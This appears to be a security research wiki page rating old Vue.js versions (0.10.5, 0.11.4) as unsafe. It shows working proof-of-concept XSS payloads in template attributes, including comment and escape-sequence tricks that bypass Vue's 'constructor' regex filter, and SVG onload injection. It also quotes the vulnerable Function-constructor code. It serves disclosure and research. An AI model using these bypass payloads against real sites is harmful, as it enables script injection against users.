

# Introduction #

"Vue.js is a library for building interactive web interfaces.
It provides data-driven components with a simple and flexible API."

From http://www.vuejs.org/

# Quick Facts #

  * [Vue.js 0.10.5 (Uncompressed)](https://raw.githubusercontent.com/yyx990803/vue/v0.10.5/dist/vue.js)
  * Usage Stats http://trends.builtwith.com/javascript/VueJS


  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are equivalent to `eval`
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> No sandbox or isolated execution scope, yet attempts to secure expressions via regex
  * **{}SEC-C** <font color='red'><b>FAIL</b></font> JavaScript code will be executed from within v-attributes
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, no obvious way to outsource templates to static files
  * **{}SEC-E** <font color='red'><b>FAIL</b></font> No dedicated security response program, one can file bugs on Github though

# Injection Attacks #

## Vue.js 0.10.5 ##

Vue.js is interesting because the commonly used `constructor.constructor`-trick does not work here. Indeed, once we try to inject this into an expression, we get an error message. It is however still possible to execute arbitrary JavaScript from inside an expression. The vector to do so looks like this:

```
<script type='text/javascript' src="http://vuejs.org/js/vue.min.js"></script>
<script type='text/javascript'>
window.onload=function(){
new Vue({
    el: '#editor',
    data: {
        input: '# hello'
    }
})
}
</script>
<div id="editor">
    <div v-html="['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(1)')()"></div>
</div>
```

Not only the `v-html` attribute can be attacked like this, also most of the other available markup sugars are welcoming this vector.

```
<script type='text/javascript' src="https://rawgit.com/yyx990803/vue/master/dist/vue.js"></script>
<script type='text/javascript'>
window.onload=function(){
new Vue({
    el: 'body',
    data: {
        clicked: false,
        selected:1,
        disp:1
    },
    methods: {
        onChange:function(){
            this.disp = this.selected;
        }
    }
})

}
</script>
<select v-model="['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(3)')()" v-on="change:['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(1)')()">
<option value="1">one</option>
<option value="2">two</option>
<option value="3">three</option>
</select>
<div v-text="['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(2)')()"></div>
```

Now, why is that so? Let's have a look at the details.

### Eval via Function ###

Not unlike a vast majority of other frameworks, Vue.js appreciates the fact that we can pour arbitrary strings into the function constructor and have some sort of eval. Still, using the common `constructor.constructor` trick is not possible here. Vue.js will even notify us on the console about a possible security violation.

The reason for that can be found here:

```
    // unicode and 'constructor' are not allowed for XSS security.
    if (UNICODE_RE.test(exp) || CTOR_RE.test(exp)) {
        utils.warn('Unsafe expression: ' + exp)
        return
    }
```

So, apparently Vue.js uses a regular expression to check, whether the term "constructor" appears inside an expression or not. If so, the expression will not be parsed and the error will be emitted instead. No XSS. excellent. Let's check that regular expression:

```
    NEWLINE_RE      = /\n/g,
    CTOR_RE         = new RegExp('constructor'.split('').join('[\'"+, ]*')),
    UNICODE_RE      = /\\u\d\d\d\d/
```

This will generate the following string (and also behold the broken regex for Unicode detection. Oh my):

```
"c['"+, ]*o['"+, ]*n['"+, ]*s['"+, ]*t['"+, ]*r['"+, ]*u['"+, ]*c['"+, ]*t['"+, ]*o['"+, ]*r"
```

We can here witness an attempt to detect the string constructor, even if concatenated. Like, for instance, the string `x['constructor']` or even `y['const'+'ructor']`. What could possibly go wrong.

Well, as the attack vector shown above proves, we can simply use comments to evade the regex and inject arbitrary JavaScript code. We can also use Unicode - unless the code point is strictly numeric:

```
<div id="editor">
    <div v-html="['c\u006Fnstructor']['c\u006Fnstructor']['c\u006Fnstructor']('alert(1)')()"></div>
</div>
```

Or just simply

```
<div id="editor">
    <div v-html="['c\x6Fnstructor']['c\x6Fnstructor']['c\x6Fnstructor']('alert(1)')()"></div>
</div>
```

Of course the whole thing is then, after successfully bypassing the protection mechanisms, poured into the usual function constructor and thereby evaluated. Extra points are given out for the comment block of course:

```
/**
 *  Create a function from a string...
 *  this looks like evil magic but since all variables are limited
 *  to the VM's data it's actually properly sandboxed
 */
function makeGetter (exp, raw) {
    var fn
    try {
        fn = new Function(exp)
    } catch (e) {
        utils.warn('Error parsing expression: ' + raw)
    }
    return fn
}
```

Vue.js needs to urgently re-think their sandbox concept. It obviously does not work by design and patching in more characters will not be overly helpful.

## Vue.js 0.11.4 ##

The current version of Vue.js made an interesting choice. The dysfunctional sandbox from the earlier tested version (0.10.5) simply got removed, there's no regular expressions or scope checks anymore.

Anything that is echoed inside a `v-html` is used as an argument for the `Function` constructor and will be evaluated in the global scope.

```
<script type='text/javascript' src="https://raw.githubusercontent.com/yyx990803/vue/0.11.4/dist/vue.js"></script>
<script type='text/javascript'>
window.onload=function(){
	new Vue({el: '#editor'})
}
</script>
<div id="editor">
    <div v-html="'\x3csvg onload=alert(1)\x3e'"></div>
</div>
```

Needless to say, we can even encode the content with HTML entities:

```
<script type='text/javascript' src="https://raw.githubusercontent.com/yyx990803/vue/0.11.4/dist/vue.js"></script>
<script type='text/javascript'>
window.onload=function(){
	new Vue({el: '#editor'})
}
</script>
<div id="editor">
    <div v-html="&apos;&bsol;x3csvg&Tab;onload=alert&lpar;1&rpar;&bsol;x3e&apos;"></div>
</div>
```

### Eval via Function ###

Again, the `Function` constructor is being used to evaluate content of expression attributes. Nothing special to see here, moving on.

```
	/**
	 * Build a getter function. Requires eval.
	 *
	 * We isolate the try/catch so it doesn't affect the
	 * optimization of the parse function when it is not called.
	 *
	 * @param {String} body
	 * @return {Function|undefined}
	 */

	function makeGetter (body) {
	  try {
	    return new Function('scope', 'return ' + body + ';')
	  } catch (e) {
	    _.warn(
	      'Invalid expression. ' +
	      'Generated function body: ' + body
	    )
	  }
	}
```